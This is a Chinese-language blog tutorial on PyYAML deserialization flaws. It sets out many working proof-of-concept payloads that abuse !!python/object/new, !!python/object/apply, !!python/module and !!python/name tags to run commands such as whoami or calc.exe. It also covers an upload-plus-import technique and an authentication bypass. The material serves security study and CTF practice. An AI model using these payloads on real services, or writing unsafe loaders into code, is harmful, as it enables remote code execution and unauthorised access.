---
title: Python yaml 反序列化
date: 2026-08-30 11:30:00
categories:
  - Web安全
tags:
  - Python
  - yaml
  - 反序列化
description: Python yaml 反序列化
---


Python YAML 反序列化 = 用 PyYAML 等库把一串 YAML 文本还原成 Python 对象。
 如果这个 YAML 来自用户 / 外部输入，并且用的是“危险的 loader”，就很容易变成 RCE（任意代码执行）等严重漏洞

## 1. 什么是YAML 反序列化

**序列化 / 反序列化：**

- 序列化：把对象 → 文本 / 字节串（方便存储 / 传输），比如 JSON、YAML、pickle。
- 反序列化：把文本 / 字节 → 对象。

**YAML 在 Python 里最常用的就是 PyYAML：**

```python
import yaml

s = """
name: Echoin
age: 18
"""

data = yaml.safe_load(s)
print(data)
# data = {'name': 'Echoin', 'age': 18}
```

这一步 `safe_load` 就是「YAML 反序列化」：YAML 文本被解析成 Python 的 dict / list / int / str 等对象。

## 2.漏洞原理

PyYAML存在以下几个特殊标签,如果这些标签被不安全的解析,会造成解析漏洞

- 从 PyYaml 版本 6.0 开始，load 的默认加载器已切换到 SafeLoader，以降低远程代码执行的风险。更新后易受攻击的是 yaml.unsafe_load 和 yaml.load(input, Loader=yaml.UnsafeLoader)

- 但是，在yaml<=5.1的版本下，默认Constructor为加载器，但是经过审计yaml模块中的Constructor.py源码中存在对于python的标签解析时的漏洞


[CTF-web: Python YAML反序列化利用_ctf 反序列化?python-CSDN博客](https://blog.csdn.net/weixin_59166557/article/details/145389640)

#### 漏洞成因

PyYAML在反序列化时，默认使用不安全的加载器（如***yaml.Loader***或***yaml.UnsafeLoader***），这些加载器会解析YAML中的特殊标签（如***!!python/object***、***!!python/object/new***等），从而执行任意Python代码。以下是常见的标签及其利用方式：

- `!!python/object` 标签指示 YAML 解析器应该将对应的 YAML 片段解析为一个 Python 对象
- !!python/object/new：允许调用类的构造函数，传递自定义参数。
- !!python/object/apply：直接调用函数或方法。
- !!python/name：引用模块中的方法或属性。
- !!python/module：加载指定模块。

例如，以下代码可以触发命令执行：

```python
import yaml

payload = """
!!python/object/new:os.system
- "whoami"
"""

yaml.load(payload, Loader=yaml.Loader)#指定loader
```

​       解释：`!!python/object/new:os.system` 让 PyYAML 去调用 os.system,这个格式等价于：

```python
os.system("whoami")
```

## 3.漏洞利用

以!!python/object/new为例：

```python
import yaml

poc = '!!python/object/new:os.system ["calc.exe"]'
#poc = '!!python/object/new:subprocess.check_output [["calc.exe"]]' 
#poc = '!!python/object/new:os.popen ["calc.exe"]'
#poc = '!!python/object/new:subprocess.run ["calc.exe"]'
#poc = '!!python/object/new:subprocess.call ["calc.exe"]'
#poc = '!!python/object/new:subprocess.Popen ["calc.exe"]'
yaml.load(poc, Loader=yaml.UnsafeLoader)  # 添加 Loader 参数
```

注：

1. **必须指定 Loader**：新版本 PyYAML 要求明确指定加载器
2. **使用 UnsafeLoader**：只有 `UnsafeLoader` 允许执行这些危险操作

```python
import yaml

# 方法1: 使用 os.system
poc1 = '!!python/object/new:os.system ["calc.exe"]'

# 方法2: 使用 subprocess.Popen
poc2 = """
!!python/object/new:subprocess.Popen
- ["calc.exe"]
"""

# 方法3: 使用 eval 执行任意代码
poc3 = """
!!python/object/apply:eval
- "__import__('os').system('calc.exe')"
"""

# 方法4: 使用 exec
poc4 = """
!!python/object/apply:exec
- "import os; os.system('calc.exe')"
"""

# 方法5: 使用 subprocess.call
poc5 = """
!!python/object/new:subprocess.call
- ["calc.exe"]
"""

# 方法6: 使用 os.popen (Windows)
poc6 = """
!!python/object/new:os.popen
- "calc.exe"
"""

# 方法7: 使用 subprocess.run (Python 3.5+)
poc7 = """
!!python/object/new:subprocess.run
- ["calc.exe"]
"""

# 方法8: 修复后的 type 创建类方法（修改前）
poc8 = """
!!python/object/new:type
  args: 
    - "Test"
    - !!python/tuple []
    - {"__init__": !!python/name:exec }
    ###❌只把 __init__ 改成了 exec，但 !!python/object/new 这条构造路径根本不会调用 __init__
  listitems: "import os; os.system('calc.exe')"
"""
(__init__ 就是 Python 里「对象初始化方法」，经常被叫成「构造函数」（虽然更严格地说构造是 __new__，__init__ 是“初始化”）)

#修改后：
poc8 = """
!!python/object/new:type
  args:
    - "Test"                 # 类名，随便
    - !!python/tuple []      # 基类 tuple（空）
    - extend: !!python/name:exec   # 把属性 extend 绑定为 exec
  listitems: "__import__('os').system('calc.exe')"   # 要执行的代码
"""

# 方法9: 使用 map 函数
poc9 = """
!!python/object/apply:map
- !!python/name:eval
- ["__import__('os').system('calc.exe')"]
"""

# 方法10: 使用 functools.partial
poc10 = """
!!python/object/new:functools.partial
- !!python/name:eval
- "__import__('os').system('calc.exe')"
"""

# 测试所有 POC
pocs = [poc1, poc2, poc3, poc4, poc5, poc6, poc7, poc8, poc9, poc10]

for i, poc in enumerate(pocs, 1):
    try:
        print(f"Testing POC {i}...")
        result = yaml.load(poc, Loader=yaml.UnsafeLoader)
        print(f"POC {i} executed successfully")
    except Exception as e:
        print(f"POC {i} failed: {e}")
    print("-" * 50)
```

#### !!python/object/new

```python
import yaml

poc = '!!python/object/new:os.system ["calc.exe"]'
#给出一些相同用法的POC
#poc = '!!python/object/new:subprocess.check_output [["calc.exe"]]' 
#poc = '!!python/object/new:os.popen ["calc.exe"]'
#poc = '!!python/object/new:subprocess.run ["calc.exe"]'
#poc = '!!python/object/new:subprocess.call ["calc.exe"]'
#poc = '!!python/object/new:subprocess.Popen ["calc.exe"]'
yaml.load(poc, Loader=yaml.UnsafeLoader)  # 添加 Loader 参数
```

#### !!python/object/apply

```python
import yaml

poc = '!!python/object/apply:os.system ["calc.exe"]'
#给出一些相同用法的POC
#poc = '!!python/object/apply:subprocess.check_output [["calc.exe"]]' 
#poc = '!!python/object/apply:os.popen ["calc.exe"]'
#poc = '!!python/object/apply:subprocess.run ["calc.exe"]'
#poc = '!!python/object/apply:subprocess.call ["calc.exe"]'
#poc = '!!python/object/apply:subprocess.Popen ["calc.exe"]'
yaml.load(poc, Loader=yaml.UnsafeLoader)  # 添加 Loader 参数
```

#### !!python/module标签（文件上传）

这个标签是加载你指定的模块的标签

例如：

```python
# eval.py
print("I am imported")
os.system("whoami")
```

这个标签可以配合***文件上传***，比如说我们将恶意代码写入"eval.py"

只要在别的地方写：

```python
import eval
```

eval.py` 顶层的代码就会立刻执行（包括 `os.system("whoami")`）。

所以 **“导入模块”本身就是一个执行点**。

`!!python/module:eval` 做的就是这件事：反序列化时，框架内部会类似这样运行：

```python
mod = __import__("eval")
return mod
```

于是 `eval.py` 顶层代码就被执行了。

所以：`!!python/module:xxx.yyy`≈ 在 Python 里执行：`import xxx.yyy`，并把这个模块对象当成反序列化结果返回。

```python
yaml.load('!!python/module:eval')     #再利用同名模块进行加载
```

**如果：**

上传目录是 `/app/uploads`
 你可以建一个 **package**：

> - 先上传 `uploads/__init__.py`（可以是空的，但里面也可以写恶意代码）
> - 再上传 `uploads/eval.py`（写恶意代码）
>
> YAML 里用：
>
> ```
> !!python/module:uploads.eval
> ```

这样 Python 相当于做：

```python
import uploads.eval
```

- `uploads` → 指向 `/app/uploads` 这个包（目录里有 `__init__.py`）
- `eval` → `/app/uploads/eval.py`
- 两个模块都会在 import 的时候执行它们的顶层代码

> 小结：`!!python/module` 的利用思路就是
>  **“想办法让上传目录变成一个 Python 包，然后通过这个 tag 触发 `import`，从而执行你上传的恶意 py 文件”。**

#### !!python/name标签

> `!!python/name:包.模块.变量名`
>  ≈ **在 Python 里执行：**
>
> ```python
> from 包.模块 import 变量名
> return 变量名
> ```

也就是：**拿到一个“模块里已有的对象”**，这个对象可以是：

- 变量（比如一个字符串常量）
- 函数
- 类
- 等等

##### 可以利用这个标签绕过认证，直接获取权限

```python
import yaml

KEY = 'Evi1s7'

def check(miyao):
    try:
        key = yaml.load(miyao).get("key",None)
    except Exception:
        key = None
    if key == KEY:
        print("你好Evi1s7")
    else:
        print("陌生人爬")
```

正常情况，后台期待前端发上来的 YAML 是这种：

```python
key: Evi1s7
```

那 `yaml.load` 出来就是 `{"key": "Evi1s7"}`，比较 OK 才通过。

而 payload 写成：

```python
key: !!python/name:__main__.KEY
```

这里：

- `__main__` 就是当前这个脚本所在模块
- `KEY` 是模块里的变量 `KEY = 'Evi1s7'`

`!!python/name:__main__.KEY` 等价于：

```python
from __main__ import KEY
# 返回这个 KEY 变量本身
```

所以整个 `yaml.load` 的结果其实是：

```python
{"key": KEY}   # key 指向了同一个对象
```

`check()` 函数里这段：

```python
key = yaml.load(miyao).get("key",None)
if key == KEY:
    ...
```

就变成了：

```python
if KEY == KEY:
    print("你好Evi1s7")
```

不需要知道真正的 KEY 字符串是什么，只要在 YAML 里写 `!!python/name:模块.变量` 就行了。

> **本质：利用 `!!python/name` 拿到后端某个“内部变量”，让反序列化结果直接变成这个变量，再参与比较，从而绕过认证。**

#### 当版本>=5.1时:

##### 漏洞成因和前面一样

1. PyYAML 5.1 之后，官方开始限制 `yaml.load` 的默认 Loader，不再默认允许随便加载 Python 对象。

2. 但 **如果开发者主动用危险的 Loader（比如 `Loader`、`UnsafeLoader`）去 load 用户输入**，这些 Python 标签（`!!python/object/apply` / `!!python/object/new` 等）还是能用。

3. 所以利用方式没根本变化，只是“**你得在代码中看到 `Loader=Loader` / `Loader=UnsafeLoader` 这种用法**”才说明有洞。

```python
import yaml 
poc= b"""!!python/object/apply:os.system
- calc"""
#subprocess.check_output
#os.popen
#subprocess.run
#subprocess.call
#subprocess.Popen

yaml.load(poc, Loader=yaml.UnsafeLoader) 
```

##### 利用builtins模块中的内置函数!!!

```python
- !!python/object/new:str
    args: []
    state: !!python/tuple
    - "__import__('os').system('whoami')"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec
 
- !!python/object/new:yaml.MappingNode
  listitems: !!str '!!python/object/apply:subprocess.Popen [whoami]'
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load


#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('whoami')"
```

# 习题：

ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx（示例token，非真实）
